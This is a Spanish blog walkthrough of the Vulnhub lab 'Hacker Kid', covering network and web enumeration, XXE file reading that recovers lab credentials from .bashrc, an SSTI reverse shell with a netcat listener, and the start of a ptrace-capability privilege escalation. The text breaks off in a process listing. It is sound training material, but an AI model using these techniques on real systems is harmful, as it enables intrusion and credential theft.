---
title: HackerKid - Vulnhub
categories: [ Linux ]
tags: [ Vulnhub ]
---

<img src="/assets/img/VH/HackerKid/hacker.jpg">

Buenas! Hoy completaremos la máquina `Hacker Kid: 1.0.1` de la plataforma [Vulnhub](https://www.vulnhub.com/entry/hacker-kid-101,719/)!, donde tocaremos los siguientes puntos

- **Web Enumeration**
- **Information Leakage**
- **Fuzzing GET parameter - Wfuzz (Range Payload)**
- **Subdomain Enumeration (dig)**
- **XXE (XML External Entity Injection) Attack**
- **XXE + Base64 Wrapper in order to read .bashrc**
- **SSTI (Server Side Template Injection - Tornado Injection (RCE)**
- **Abusing Capabilities (Python2.7 cap_sys_ptrace+ep) - Injecting BIND TCP shellcode into root process [Privilege Escalation]"**

## Reconocimiento

* * * 

Bueno, como en todas las máquinas, primeramente tendremos que saber que dirección IPv4 tiene, por lo que usaremos la herramienta `arp-scan` para escanear toda nuestra red local

```shell
❯ arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ed:e8:42, IPv4: 192.168.1.84
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	94:6a:b0:5c:aa:ed (52:6a:b0:5c:aa:ee)	Arcadyan Corporation
192.168.1.92	a8:93:4a:00:55:55	CHONGQING FUGUI ELECTRONICS CO.,LTD.
192.168.1.72	b2:be:76:79:1a:2c (52:6a:b0:5c:aa:ee)	(Unknown: locally administered)
192.168.1.148	00:0c:29:95:f1:36	VMware, Inc.
192.168.1.90	9e:56:33:42:60:7e (52:6a:b0:5c:aa:ee)	(Unknown: locally administered)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.031 seconds (126.05 hosts/sec). 5 responded
```

Basandonos en el OUI (Organizational Unique Identifier), que son las primeras tres partes de la dirección MAC, nos damos cuenta que la IP `192.168.1.148` le corresponde a VMware, así que esa es la máquina víctima, procederemos con un escaneo de puertos con nmap

```shell
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.148 -oG allPorts
Nmap scan report for 192.168.1.148
PORT     STATE SERVICE REASON
53/tcp   open  domain  syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
9999/tcp open  abyss   syn-ack ttl 64
MAC Address: 00:0C:29:95:F1:36 (VMware)
```

Ahora que tenemos la captura grepeable en el archivo `allPorts`, usaremos la herramienta `extractPorts` para grepear por información importante

```shell
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ extractPorts () {
   2   │     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
   3   │     ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
   4   │     echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
   5   │     echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
   6   │     echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
   7   │     echo $ports | tr -d '\n' | xclip -sel clip
   8   │     echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
   9   │     /bin/batcat --paging=never extractPorts.tmp
  10   │     rm extractPorts.tmp
  11   │ }
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 192.168.1.148
   5   │     [*] Open ports: 53,80,9999
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora que tenemos los puertos copiados en la clipboard, procederemos con un escaneo más exhaustivo únicamente sobre estos puertos

```shell
❯ nmap -p53,80,9999 -sCV 192.168.1.148 -oN targeted
Nmap scan report for ubuntu.home (192.168.1.148)
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Notorious Kid : A Hacker 
|_http-server-header: Apache/2.4.41 (Ubuntu)
9999/tcp open  http    Tornado httpd 6.1
|_http-server-header: TornadoServer/6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
MAC Address: 00:0C:29:95:F1:36 (VMware)
```

Antes de acceder al servicio HTTP, escanearemos las tecnologías corriendo en los servicios con la herramienta `whatweb`

```shell

❯ whatweb http://192.168.1.148
http://192.168.1.148 [200 OK] Apache[2.4.41], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.1.148], JQuery, Script, Title[Notorious Kid : A Hacker]
❯ whatweb http://192.168.1.148:9999
http://192.168.1.148:9999 [302 Found] Country[RESERVED][ZZ], HTTPServer[TornadoServer/6.1], IP[192.168.1.148], RedirectLocation[/login?next=%2F]
http://192.168.1.148:9999/login?next=%2F [200 OK] Cookies[_xsrf], Country[RESERVED][ZZ], HTTPServer[TornadoServer/6.1], IP[192.168.1.148], PasswordField[password], Title[Please Log In]
```

Accederemos al servicio HTTP corriendo en el puerto 80, nos encontramos con esto

![](/assets/img/VH/HackerKid/web.png)

Checkeando el código fuente de la página web, encontramos un comentario interesante

```html
<!--

<div class="container py-5">
  <h1>Thanks</h1>

 TO DO: Use a GET parameter page_no  to view pages.
-->
```

Teniendo esto en cuenta, podemos concatenarle `/?page_no={}` a la URL, si ponemos cualquier número, nos aparece lo siguiente

![](/assets/img/VH/HackerKid/web1.png)

Podemos fuzzear con la herramienta `wfuzz` por números en la url, eso mismo haremos

```shell
 ❯ wfuzz -c --hh=3654 -t 200 -z range,1-10000 'http://192.168.1.148/?page_no=FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.148/?page_no=FUZZ
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000021:   200        116 L    310 W      3849 Ch     "21"
```

Ahora si ponemos el número en el parámetro, nos aparece lo siguiente

![](/assets/img/VH/HackerKid/web2.png)

El mensaje nos da el subdominio `hackers.blackhat.local`, lo agregaremos al archivo `/etc/hosts`

```shell
❯ echo "192.168.1.148 blackhat.local hackers.blackhat.local" | tee -a /etc/hosts
192.168.1.148 blackhat.local hackers.blackhat.local
```

Sí accedemos a la página `blackhat.local`, nos devuelve un código de estado 403 forbidden

![](/assets/img/VH/HackerKid/forbidden.png)

Ahora que no podemos proceder a nada, intentaremos buscar subdominios con la herramienta `dig`

```shell
❯ dig hackers.blackhat.local @192.168.1.148

; <<>> DiG 9.18.12-1-Debian <<>> hackers.blackhat.local @192.168.1.148
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 30679
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 479baecb6816d7bd01000000640323c6d9531ad89206f993 (good)
;; QUESTION SECTION:
;hackers.blackhat.local.		IN	A

;; AUTHORITY SECTION:
blackhat.local.		3600	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600

;; Query time: 0 msec
;; SERVER: 192.168.1.148#53(192.168.1.148) (UDP)
;; WHEN: Sat Mar 04 11:56:06 CET 2023
;; MSG SIZE  rcvd: 125
```

Encontramos el subdominio `hackerkid.blackhat.local`, el cúal lo añadiremos al `/etc/hosts`

![](/assets/img/VH/HackerKid/hackerkid.png)

## Explotación

### XXE (XML External Entity Injection)

* * *

Interceptaremos la petición con `BurpSuite`, nos encontramos lo siguiente

![](/assets/img/VH/HackerKid/xxe.png)

Sabiendo que el campo `EMAIL` queda reflejado en la página, podemos intentar inyectar código XML, intentando un ataque XXE (Xml External Entity Injection)

![](/assets/img/VH/HackerKid/xxe1.png)

Previamente, nos habían hablado de un directorio home, así que intentaremos leer el archivo `.bashrc` del usuario `saket`

![](/assets/img/VH/HackerKid/xxe2.png)

Ahora, decodearemos el contenido, y nos encontramos lo siguiente...

```shell
❯ echo "IyB+Ly5iYXNocmM6IGV4ZWN1dGVkIGJ5IGJhc2goMSkgZm9yIG5vbi1sb2dpbiBzaGVsbHMuCiMgc2VlIC91c3Ivc2hhcmUvZG9jL2Jhc2gvZXhhbXBsZXMvc3RhcnR1cC1maWxlcyAoaW4gdGhlIHBhY2thZ2UgYmFzaC1kb2MpCiMgZm9yIGV4YW1wbGVzCgojIElmIG5vdCBydW5uaW5nIGludGVyYWN0aXZlbHksIGRvbid0IGRvIGFueXRoaW5nCmNhc2UgJC0gaW4KICAgICppKikgOzsKICAgICAgKikgcmV0dXJuOzsKZXNhYwoKIyBkb24ndCBwdXQgZHVwbGljYXRlIGxpbmVzIG9yIGxpbmVzIHN0YXJ0aW5nIHdpdGggc3BhY2UgaW4gdGhlIGhpc3RvcnkuCiMgU2VlIGJhc2goMSkgZm9yIG1vcmUgb3B0aW9ucwpISVNUQ09OVFJPTD1pZ25vcmVib3RoCgojIGFwcGVuZCB0byB0aGUgaGlzdG9yeSBmaWxlLCBkb24ndCBvdmVyd3JpdGUgaXQKc2hvcHQgLXMgaGlzdGFwcGVuZAoKIyBmb3Igc2V0dGluZyBoaXN0b3J5IGxlbmd0aCBzZWUgSElTVFNJWkUgYW5kIEhJU1RGSUxFU0laRSBpbiBiYXNoKDEpCkhJU1RTSVpFPTEwMDAKSElTVEZJTEVTSVpFPTIwMDAKCiMgY2hlY2sgdGhlIHdpbmRvdyBzaXplIGFmdGVyIGVhY2ggY29tbWFuZCBhbmQsIGlmIG5lY2Vzc2FyeSwKIyB1cGRhdGUgdGhlIHZhbHVlcyBvZiBMSU5FUyBhbmQgQ09MVU1OUy4Kc2hvcHQgLXMgY2hlY2t3aW5zaXplCgojIElmIHNldCwgdGhlIHBhdHRlcm4gIioqIiB1c2VkIGluIGEgcGF0aG5hbWUgZXhwYW5zaW9uIGNvbnRleHQgd2lsbAojIG1hdGNoIGFsbCBmaWxlcyBhbmQgemVybyBvciBtb3JlIGRpcmVjdG9yaWVzIGFuZCBzdWJkaXJlY3Rvcmllcy4KI3Nob3B0IC1zIGdsb2JzdGFyCgojIG1ha2UgbGVzcyBtb3JlIGZyaWVuZGx5IGZvciBub24tdGV4dCBpbnB1dCBmaWxlcywgc2VlIGxlc3NwaXBlKDEpClsgLXggL3Vzci9iaW4vbGVzc3BpcGUgXSAmJiBldmFsICIkKFNIRUxMPS9iaW4vc2ggbGVzc3BpcGUpIgoKIyBzZXQgdmFyaWFibGUgaWRlbnRpZnlpbmcgdGhlIGNocm9vdCB5b3Ugd29yayBpbiAodXNlZCBpbiB0aGUgcHJvbXB0IGJlbG93KQppZiBbIC16ICIke2RlYmlhbl9jaHJvb3Q6LX0iIF0gJiYgWyAtciAvZXRjL2RlYmlhbl9jaHJvb3QgXTsgdGhlbgogICAgZGViaWFuX2Nocm9vdD0kKGNhdCAvZXRjL2RlYmlhbl9jaHJvb3QpCmZpCgojIHNldCBhIGZhbmN5IHByb21wdCAobm9uLWNvbG9yLCB1bmxlc3Mgd2Uga25vdyB3ZSAid2FudCIgY29sb3IpCmNhc2UgIiRURVJNIiBpbgogICAgeHRlcm0tY29sb3J8Ki0yNTZjb2xvcikgY29sb3JfcHJvbXB0PXllczs7CmVzYWMKCiMgdW5jb21tZW50IGZvciBhIGNvbG9yZWQgcHJvbXB0LCBpZiB0aGUgdGVybWluYWwgaGFzIHRoZSBjYXBhYmlsaXR5OyB0dXJuZWQKIyBvZmYgYnkgZGVmYXVsdCB0byBub3QgZGlzdHJhY3QgdGhlIHVzZXI6IHRoZSBmb2N1cyBpbiBhIHRlcm1pbmFsIHdpbmRvdwojIHNob3VsZCBiZSBvbiB0aGUgb3V0cHV0IG9mIGNvbW1hbmRzLCBub3Qgb24gdGhlIHByb21wdAojZm9yY2VfY29sb3JfcHJvbXB0PXllcwoKaWYgWyAtbiAiJGZvcmNlX2NvbG9yX3Byb21wdCIgXTsgdGhlbgogICAgaWYgWyAteCAvdXNyL2Jpbi90cHV0IF0gJiYgdHB1dCBzZXRhZiAxID4mL2Rldi9udWxsOyB0aGVuCgkjIFdlIGhhdmUgY29sb3Igc3VwcG9ydDsgYXNzdW1lIGl0J3MgY29tcGxpYW50IHdpdGggRWNtYS00OAoJIyAoSVNPL0lFQy02NDI5KS4gKExhY2sgb2Ygc3VjaCBzdXBwb3J0IGlzIGV4dHJlbWVseSByYXJlLCBhbmQgc3VjaAoJIyBhIGNhc2Ugd291bGQgdGVuZCB0byBzdXBwb3J0IHNldGYgcmF0aGVyIHRoYW4gc2V0YWYuKQoJY29sb3JfcHJvbXB0PXllcwogICAgZWxzZQoJY29sb3JfcHJvbXB0PQogICAgZmkKZmkKCmlmIFsgIiRjb2xvcl9wcm9tcHQiID0geWVzIF07IHRoZW4KICAgIFBTMT0nJHtkZWJpYW5fY2hyb290OisoJGRlYmlhbl9jaHJvb3QpfVxbXDAzM1swMTszMm1cXVx1QFxoXFtcMDMzWzAwbVxdOlxbXDAzM1swMTszNG1cXVx3XFtcMDMzWzAwbVxdXCQgJwplbHNlCiAgICBQUzE9JyR7ZGViaWFuX2Nocm9vdDorKCRkZWJpYW5fY2hyb290KX1cdUBcaDpcd1wkICcKZmkKdW5zZXQgY29sb3JfcHJvbXB0IGZvcmNlX2NvbG9yX3Byb21wdAoKIyBJZiB0aGlzIGlzIGFuIHh0ZXJtIHNldCB0aGUgdGl0bGUgdG8gdXNlckBob3N0OmRpcgpjYXNlICIkVEVSTSIgaW4KeHRlcm0qfHJ4dnQqKQogICAgUFMxPSJcW1xlXTA7JHtkZWJpYW5fY2hyb290OisoJGRlYmlhbl9jaHJvb3QpfVx1QFxoOiBcd1xhXF0kUFMxIgogICAgOzsKKikKICAgIDs7CmVzYWMKCiMgZW5hYmxlIGNvbG9yIHN1cHBvcnQgb2YgbHMgYW5kIGFsc28gYWRkIGhhbmR5IGFsaWFzZXMKaWYgWyAteCAvdXNyL2Jpbi9kaXJjb2xvcnMgXTsgdGhlbgogICAgdGVzdCAtciB+Ly5kaXJjb2xvcnMgJiYgZXZhbCAiJChkaXJjb2xvcnMgLWIgfi8uZGlyY29sb3JzKSIgfHwgZXZhbCAiJChkaXJjb2xvcnMgLWIpIgogICAgYWxpYXMgbHM9J2xzIC0tY29sb3I9YXV0bycKICAgICNhbGlhcyBkaXI9J2RpciAtLWNvbG9yPWF1dG8nCiAgICAjYWxpYXMgdmRpcj0ndmRpciAtLWNvbG9yPWF1dG8nCgogICAgYWxpYXMgZ3JlcD0nZ3JlcCAtLWNvbG9yPWF1dG8nCiAgICBhbGlhcyBmZ3JlcD0nZmdyZXAgLS1jb2xvcj1hdXRvJwogICAgYWxpYXMgZWdyZXA9J2VncmVwIC0tY29sb3I9YXV0bycKZmkKCiMgY29sb3JlZCBHQ0Mgd2FybmluZ3MgYW5kIGVycm9ycwojZXhwb3J0IEdDQ19DT0xPUlM9J2Vycm9yPTAxOzMxOndhcm5pbmc9MDE7MzU6bm90ZT0wMTszNjpjYXJldD0wMTszMjpsb2N1cz0wMTpxdW90ZT0wMScKCiMgc29tZSBtb3JlIGxzIGFsaWFzZXMKYWxpYXMgbGw9J2xzIC1hbEYnCmFsaWFzIGxhPSdscyAtQScKYWxpYXMgbD0nbHMgLUNGJwoKIyBBZGQgYW4gImFsZXJ0IiBhbGlhcyBmb3IgbG9uZyBydW5uaW5nIGNvbW1hbmRzLiAgVXNlIGxpa2Ugc286CiMgICBzbGVlcCAxMDsgYWxlcnQKYWxpYXMgYWxlcnQ9J25vdGlmeS1zZW5kIC0tdXJnZW5jeT1sb3cgLWkgIiQoWyAkPyA9IDAgXSAmJiBlY2hvIHRlcm1pbmFsIHx8IGVjaG8gZXJyb3IpIiAiJChoaXN0b3J5fHRhaWwgLW4xfHNlZCAtZSAnXCcncy9eXHMqWzAtOV1cK1xzKi8vO3MvWzsmfF1ccyphbGVydCQvLydcJycpIicKCiMgQWxpYXMgZGVmaW5pdGlvbnMuCiMgWW91IG1heSB3YW50IHRvIHB1dCBhbGwgeW91ciBhZGRpdGlvbnMgaW50byBhIHNlcGFyYXRlIGZpbGUgbGlrZQojIH4vLmJhc2hfYWxpYXNlcywgaW5zdGVhZCBvZiBhZGRpbmcgdGhlbSBoZXJlIGRpcmVjdGx5LgojIFNlZSAvdXNyL3NoYXJlL2RvYy9iYXNoLWRvYy9leGFtcGxlcyBpbiB0aGUgYmFzaC1kb2MgcGFja2FnZS4KCmlmIFsgLWYgfi8uYmFzaF9hbGlhc2VzIF07IHRoZW4KICAgIC4gfi8uYmFzaF9hbGlhc2VzCmZpCgojIGVuYWJsZSBwcm9ncmFtbWFibGUgY29tcGxldGlvbiBmZWF0dXJlcyAoeW91IGRvbid0IG5lZWQgdG8gZW5hYmxlCiMgdGhpcywgaWYgaXQncyBhbHJlYWR5IGVuYWJsZWQgaW4gL2V0Yy9iYXNoLmJhc2hyYyBhbmQgL2V0Yy9wcm9maWxlCiMgc291cmNlcyAvZXRjL2Jhc2guYmFzaHJjKS4KaWYgISBzaG9wdCAtb3EgcG9zaXg7IHRoZW4KICBpZiBbIC1mIC91c3Ivc2hhcmUvYmFzaC1jb21wbGV0aW9uL2Jhc2hfY29tcGxldGlvbiBdOyB0aGVuCiAgICAuIC91c3Ivc2hhcmUvYmFzaC1jb21wbGV0aW9uL2Jhc2hfY29tcGxldGlvbgogIGVsaWYgWyAtZiAvZXRjL2Jhc2hfY29tcGxldGlvbiBdOyB0aGVuCiAgICAuIC9ldGMvYmFzaF9jb21wbGV0aW9uCiAgZmkKZmkKCiNTZXR0aW5nIFBhc3N3b3JkIGZvciBydW5uaW5nIHB5dGhvbiBhcHAKdXNlcm5hbWU9ImFkbWluIgpwYXNzd29yZD0iU2FrZXQhIyQlQCEhIgo=" | base64 -d | tail -n 4

#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```

Tenemos credenciales válidas para la aplicación de python web, así que accederemos con las credenciales

![](/assets/img/VH/HackerKid/creds.png)

### SSTI (Server Side Template Injection)

* * *

Nos encontramos con lo siguiente

![](/assets/img/VH/HackerKid/web3.png)

Con el parámetro `?name` le podemos proporcionar un nombre el cúal queda reflejado en la web

![](/assets/img/VH/HackerKid/ssti.png)

Intentaremos la típica inyección, lo cual nos confirma que estamos delante de un `SSTI`

![](/assets/img/VH/HackerKid/ssti1.png)

Podemos inyectar este [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) para ejecutar comandos en la máquina víctima, así que nos pondremos en escucha en el puerto 443 con la herramienta `netcat`, el payload lo deberemos de URL-Encodear, obtenemos la reverse shell

```shell
❯ nc -nlvp 443
listening on [any] 443 ...
saket@ubuntu:~$ whoami
whoami
saket
saket@ubuntu:~$ id
id
uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
saket@ubuntu:~$ hostname -I
hostname -I
192.168.1.148 
saket@ubuntu:~$ 
```

## Escalada de Privilegios

* * *

Buscando por capabilities nos encontramos con lo siguiente

```shell
saket@ubuntu:~$ /sbin/getcap -r / 2>/dev/null
/snap/core20/1822/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
saket@ubuntu:~$ 
```

El binario de Python2.7 tiene la capability `cap_sys_ptrace` para explotar esta vulnerabilidad, nos podemos guiar de [este](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc) post, para comenzar, tenemos que buscar un proceso que corra el usuario `root`

```shell
saket@ubuntu:~$ ps -eaf | grep root
root           1       0  0 02:10 ?        00:00:05 /sbin/init auto noprompt
root           2       0  0 02:10 ?        00:00:00 [kthreadd]
root           3       2  0 02:10 ?        00:00:00 [rcu_gp]
root           4       2  0 02:10 ?        00:00:00 [rcu_par_gp]
root           6       2  0 02:10 ?        00:00:00 [kworker/0:0H-kblockd]
root           9       2  0 02:10 ?        00:00:00 [mm_percpu_wq]
root          10       2  0 02:10 ?        00:00:00 [ksoftirqd/0]
root          11       2  0 02:10 ?        00:00:00 [rcu_sched]
root          12       2  0 02:10 ?        00:00:00 [migration/0]
root          13       2  0 02:10 ?        00:00:00 [idle_inject/0]
root          14       2  0 02:10 ?        00:00:00 [cpuhp/0]
root          15       2  0 02:10 ?        00:00:00 [cpuhp/1]
root          16       2  0 02:10 ?        00:00:00 [idle_inject/1]
root          17       2  0 02:10 ?        00:00:00 [migration/1]
root          18       2  0 02:10 ?        00:00:00 [ksoftirqd/1]
root          20       2  0 02:10 ?        00:00:00 [kworker/1:0H-kblockd]
root          21       2  0 02:10 ?        00:00:00 [kdevtmpfs]
root          22       2  0 02:10 ?        00:00:00 [netns]
root          23       2  0 02:10 ?        00:00:00 [rcu_tasks_kthre]
root          24       2  0 02:10 ?        00:00:00 [rcu_tasks_rude_]
root          25       2  0 02:10 ?        00:00:00 [rcu_tasks_trace]
root          26       2  0 02:10 ?        00:00:00 [kauditd]
root          28       2  0 02:10 ?        00:00:00 [khungtaskd]
root          29       2  0 02:10 ?        00:00:00 [oom_reaper]
root          30       2  0 02:10 ?        00:00:00 [writeback]
root          31       2  0 02:10 ?        00:00:00 [kcompactd0]
root          32       2  0 02:10 ?        00:00:00 [ksmd]
root          33       2  0 02:10 ?        00:00:00 [khugepaged]
root          80       2  0 02:10 ?        00:00:00 [kintegrityd]
root          81       2  0 02:10 ?        00:00:00 [kblockd]
root          82       2  0 02:10 ?        00:00:00 [blkcg_punt_bio]
root          84       2  0 02:10 ?        00:00:00 [tpm_dev_wq]
root          85       2  0 02:10 ?        00:00:00 [ata_sff]
root          86       2  0 02:10 ?        00:00:00 [md]
root          87       2  0 02:10 ?        00:00:00 [edac-poller]
root          88       2  0 02:10 ?        00:00:00 [devfreq_wq]
root          89       2  0 02:10 ?        00:00:00 [watchdogd]
root          91       2  0 02:10 ?        00:00:00 [pm_wq]
root          93       2  0 02:10 ?        00:00:00 [kswapd0]
root          94       2  0 02:10 ?        00:00:00 [ecryptfs-kthrea]
root          96       2  0 02:10 ?        00:00:00 [kthrotld]
root          97       2  0 02:10 ?        00:00:00 [irq/24-pciehp]
root          98       2  0 02:10 ?        00:00:00 [irq/25-pciehp]
root          99       2  0 02:10 ?        00:00:00 [irq/26-pciehp]
root         100       2  0 02:10 ?        00:00:00 [irq/27-pciehp]
root         101       2  0 02:10 ?        00:00:00 [irq/28-pciehp]
root         102       2  0 02:10 ?        00:00:00 [irq/29-pciehp]
root         103       2  0 02:10 ?        00:00:00 [irq/30-pciehp]
root         104       2  0 02:10 ?        00:00:00 [irq/31-pciehp]
root         105       2  0 02:10 ?        00:00:00 [irq/32-pciehp]
root         106       2  0 02:10 ?        00:00:00 [irq/33-pciehp]
root         107       2  0 02:10 ?        00:00:00 [irq/34-pciehp]
root         108       2  0 02:10 ?        00:00:00 [irq/35-pciehp]
root         109       2  0 02:10 ?        00:00:00 [irq/36-pciehp]
root         110       2  0 02:10 ?        00:00:00 [irq/37-pciehp]
root         111       2  0 02:10 ?        00:00:00 [irq/38-pciehp]
root         112       2  0 02:10 ?        00:00:00 [irq/39-pciehp]
root         113       2  0 02:10 ?        00:00:00 [irq/40-pciehp]
root         114       2  0 02:10 ?        00:00:00 [irq/41-pciehp]
root         115       2  0 02:10 ?        00:00:00 [irq/42-pciehp]
root         116       2  0 02:10 ?        00:00:00 [irq/43-pciehp]
root         117       2  0 02:10 ?        00:00:00 [irq/44-pciehp]
root         118       2  0 02:10 ?        00:00:00 [irq/45-pciehp]
root         119       2  0 02:10 ?        00:00:00 [irq/46-pciehp]
root         120       2  0 02:10 ?        00:00:00 [irq/47-pciehp]
root         121       2  0 02:10 ?        00:00:00 [irq/48-pciehp]
root         122       2  0 02:10 ?        00:00:00 [irq/49-pciehp]
root         123       2  0 02:10 ?        00:00:00 [irq/50-pciehp]
root         124       2  0 02:10 ?        00:00:00 [irq/51-pciehp]
root         125       2  0 02:10 ?        00:00:00 [irq/52-pciehp]
root         126       2  0 02:10 ?        00:00:00 [irq/53-pciehp]
root         127       2  0 02:10 ?        00:00:00 [irq/54-pciehp]
root         128       2  0 02:10 ?        00:00:00 [irq/55-pciehp]
root         129       2  0 02:10 ?        00:00:00 [acpi_thermal_pm]
root         130       2  0 02:10 ?        00:00:00 [scsi_eh_0]
root         131       2  0 02:10 ?        00:00:00 [scsi_tmf_0]
root         132       2  0 02:10 ?        00:00:00 [scsi_eh_1]
root         133       2  0 02:10 ?        00:00:00 [scsi_tmf_1]
root         135       2  0 02:10 ?        00:00:00 [vfio-irqfd-clea]
root         136       2  0 02:10 ?        00:00:00 [ipv6_addrconf]
root         146       2  0 02:10 ?        00:00:00 [kstrp]
root         149       2  0 02:10 ?        00:00:00 [zswap-shrink]
root         150       2  0 02:10 ?        00:00:00 [kworker/u257:0-hci0]
root         155       2  0 02:10 ?        00:00:00 [charger_manager]
root         198       2  0 02:10 ?        00:00:01 [kworker/0:3-events]
root         199       2  0 02:10 ?        00:00:00 [mpt_poll_0]
root         200       2  0 02:10 ?        00:00:00 [mpt/0]
root         201       2  0 02:10 ?        00:00:00 [scsi_eh_2]
root         202       2  0 02:10 ?        00:00:00 [scsi_tmf_2]
root         203       2  0 02:10 ?        00:00:00 [scsi_eh_3]
root         204       2  0 02:10 ?        00:00:00 [scsi_tmf_3]
root         205       2  0 02:10 ?        00:00:00 [scsi_eh_4]
root         206       2  0 02:10 ?        00:00:00 [scsi_tmf_4]
root         207       2  0 02:10 ?        00:00:00 [scsi_eh_5]
root         208       2  0 02:10 ?        00:00:00 [scsi_tmf_5]
root         209       2  0 02:10 ?        00:00:00 [scsi_eh_6]
root         210       2  0 02:10 ?        00:00:00 [scsi_tmf_6]
root         211       2  0 02:10 ?        00:00:00 [scsi_eh_7]
root         212       2  0 02:10 ?        00:00:00 [scsi_tmf_7]
root         213       2  0 02:10 ?        00:00:00 [scsi_eh_8]
root         214       2  0 02:10 ?        00:00:00 [scsi_tmf_8]
root         215       2  0 02:10 ?        00:00:00 [scsi_eh_9]
root         216       2  0 02:10 ?        00:00:00 [scsi_tmf_9]
root         217       2  0 02:10 ?        00:00:00 [scsi_eh_10]
root         218       2  0 02:10 ?        00:00:00 [scsi_tmf_10]
root         219       2  0 02:10 ?        00:00:00 [scsi_eh_11]
root         220       2  0 02:10 ?        00:00:00 [scsi_tmf_11]
root         221       2  0 02:10 ?        00:00:00 [scsi_eh_12]
root         222       2  0 02:10 ?        00:00:00 [scsi_tmf_12]
root         223       2  0 02:10 ?        00:00:00 [scsi_eh_13]
root         224       2  0 02:10 ?        00:00:00 [scsi_tmf_13]
root         225       2  0 02:10 ?        00:00:00 [scsi_eh_14]
root         226       2  0 02:10 ?        00:00:00 [scsi_tmf_14]
root         227       2  0 02:10 ?        00:00:00 [scsi_eh_15]
root         228       2  0 02:10 ?        00:00:00 [scsi_tmf_15]
root         229       2  0 02:10 ?        00:00:00 [scsi_eh_16]
root         230       2  0 02:10 ?        00:00:00 [scsi_tmf_16]
root         231       2  0 02:10 ?        00:00:00 [scsi_eh_17]
root         232       2  0 02:10 ?        00:00:00 [scsi_tmf_17]
root         233       2  0 02:10 ?        00:00:00 [scsi_eh_18]
root         234       2  0 02:10 ?        00:00:00 [scsi_tmf_18]
root         235       2  0 02:10 ?        00:00:00 [scsi_eh_19]
root         236       2  0 02:10 ?        00:00:00 [scsi_tmf_19]
root         237       2  0 02:10 ?        00:00:00 [scsi_eh_20]
root         238       2  0 02:10 ?        00:00:00 [scsi_tmf_20]
root         239       2  0 02:10 ?        00:00:00 [scsi_eh_21]
root         240       2  0 02:10 ?        00:00:00 [scsi_tmf_21]
root         241       2  0 02:10 ?        00:00:00 [scsi_eh_22]
root         242       2  0 02:10 ?        00:00:00 [scsi_tmf_22]
root         243       2  0 02:10 ?        00:00:00 [scsi_eh_23]
root         244       2  0 02:10 ?        00:00:00 [scsi_tmf_23]
root         245       2  0 02:10 ?        00:00:00 [scsi_eh_24]
root         246       2  0 02:10 ?        00:00:00 [scsi_tmf_24]
root         247       2  0 02:10 ?        00:00:00 [scsi_eh_25]
root         248       2  0 02:10 ?        00:00:00 [scsi_tmf_25]
root         249       2  0 02:10 ?        00:00:00 [scsi_eh_26]
root         250       2  0 02:10 ?        00:00:00 [scsi_tmf_26]
root         251       2  0 02:10 ?        00:00:00 [scsi_eh_27]
root         252       2  0 02:10 ?        00:00:00 [scsi_tmf_27]
root         253       2  0 02:10 ?        00:00:00 [scsi_eh_28]
root         254       2  0 02:10 ?        00:00:00 [scsi_tmf_28]
